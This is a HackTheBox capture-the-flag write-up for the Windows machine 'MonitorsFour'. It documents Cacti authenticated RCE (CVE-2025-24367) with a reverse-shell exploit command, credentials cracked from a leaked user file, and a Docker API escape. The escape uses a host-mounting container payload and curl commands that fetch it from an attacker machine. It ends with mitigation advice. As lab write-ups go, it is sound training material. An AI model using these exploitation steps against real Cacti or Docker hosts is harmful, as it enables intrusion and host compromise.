# MonitorsFour - HackTheBox Writeup

**Date:** 2026-03-22
**OS:** Windows
**IP Address:** 10.129.7.210
**Difficulty:** Easy
**Points:** 20

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **MonitorsFour**. 

*   **Initial Access:** Gained authenticated RCE on a Cacti instance (CVE-2025-24367) using credentials obtained from a leaked JSON file.
*   **Privilege Escalation:** Exploited an exposed Docker API (`192.168.65.7:2375`) from within a container to mount the host's `C:` drive and read the root flag.
*   **Key Learning Points:** 
    * Authenticated RCE vulnerabilities in network monitoring tools like Cacti.
    * Importance of secure credential storage and MD5 hash weaknesses.
    * Virtual Host discovery to identify hidden internal services.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 80 | HTTP | nginx | Redirects to monitorsfour.htb |
| 5985 | WSMAN | [Version] | Microsoft HTTPAPI httpd 2.0 |

**Nmap Command:**
```bash
nmap -sC -sV -p- -oN nmap/initial 10.129.7.210
```

## 2.2. Web Enumeration
**Strategy:** Virtual Host Discovery and Directory Brute Forcing.

### Directory Brute Forcing
```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
**Findings:** `/user`, `/login`, `/forgot-password`.

### Virtual Host Discovery
```bash
ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```
**Findings:** `cacti.monitorsfour.htb`.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** CVE-2025-24367 - Cacti Authenticated Graph Template RCE.
*   **Vector:** Authenticated Graph Template modification through `graph_templates.php`.

## 3.2. Exploitation Path
1.  Discovered `monitorsfour-users.json` containing MD5 hashes for several users.
2.  Cracked the MD5 hash for `Marcus Higgins` (`56b32eb43e6f15395f6c46c1c9e1cd36`) resulting in the password `wonderful1`.
3.  Accessed `cacti.monitorsfour.htb` using `marcus:wonderful1`.
4.  Executed a Python exploit (`exploit.py`) targeting CVE-2025-24367 to gain a reverse shell as `www-data`.
5.  Navigated to `/home/marcus` to retrieve the user flag.

**Payload/Tool:**
```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.67 -l 4444 -url http://cacti.monitorsfour.htb
```

**User Flag:**
```bash
cat /home/marcus/user.txt
# 4d7611714fc2f4c31875200f76a3a95e
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
*   Upon gaining a reverse shell as `www-data`, enumeration revealed we were inside a Docker container (hostname `821fbd6a43fa`).
*   Checking `/etc/resolv.conf` revealed an interesting internal resolver IP: `192.168.65.7`. This IP is often associated with Docker Desktop's internal networking layout, representing the host.
*   Pinging or curling the Docker API port on that IP (`curl http://192.168.65.7:2375/images/json`) returned a list of Docker images, proving the Docker Daemon API was exposed and accessible without authentication from our container.

## 4.2. Exploitation Path
1.  Created a malicious JSON payload (`container_expl.json`) to create a new container. This container mounts the host's Windows `C:` drive to `/mnt/host_root` and executes a command to read `root.txt`.
2.  Hosted the JSON file on the attacker machine and downloaded it to the container's `/tmp` directory.
3.  Made a `POST` request to the exposed Docker API to create the container named `netanix`.
4.  Started the newly created container.
5.  Retrieved the container logs via the Docker API, which contained the output of the executed command (the root flag).

**Payload (`container_expl.json`):**
```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

**Exploitation Commands:**
```bash
# 1. Download payload to the target container
curl http://10.10.15.67:8000/container_expl.json -o /tmp/container.json

# 2. Create the malicious container via Docker API
curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json \
http://192.168.65.7:2375/containers/create?name=netanix

# Output: {"Id":"25b565d328805051f091109dc12d19b7c56ed7cffc325d168e81020041eac126","Warnings":[]}

# 3. Start the container using its ID
curl -X POST http://192.168.65.7:2375/containers/25b565d328805051f091109dc12d19b7c56ed7cffc325d168e81020041eac126/start

# 4. Get the root flag from the container logs
curl http://192.168.65.7:2375/containers/25b565d328805051f091109dc12d19b7c56ed7cffc325d168e81020041eac126/logs?stdout=true
```

**Root Flag:**
```bash
de6fc5efb0f5c10e46cd242f90fd618f
```

---

# 5. Credentials & Loot

| Username / Item | Password / Hash / Flag | Source |
| :--- | :--- | :--- |
| admin (Marcus Higgins) | wonderful1 | monitorsfour-users.json |
| mwatson | 69196959c16b26ef00b77d82cf6eb169 | monitorsfour-users.json |
| janderson | 2a22dcf99190c322d974c8df5ba3256b | monitorsfour-users.json |
| dthompson | 8d4a7e7fd08555133e056d9aacb1e519 | monitorsfour-users.json |
| User Flag | 4d7611714fc2f4c31875200f76a3a95e | /home/marcus/user.txt |
| Root Flag | de6fc5efb0f5c10e46cd242f90fd618f | C:\Users\Administrator\Desktop\root.txt |

---

# 6. Recommendations & Mitigation
1. **Unsecured JSON file:** Remove files like `monitorsfour-users.json` from publicly accessible web directories.
2. **Weak Hashing:** Use modern, salted hashing algorithms (e.g., Argon2, bcrypt) instead of MD5.
3. **Outdated Software:** Update Cacti to a version where CVE-2025-24367 is patched.
4. **Exposed Docker API:** Do not expose the Docker daemon API on a network interface accessible from within unprivileged containers without mutual TLS authentication. The `192.168.65.7:2375` endpoint allowed container breakout and host compromise.


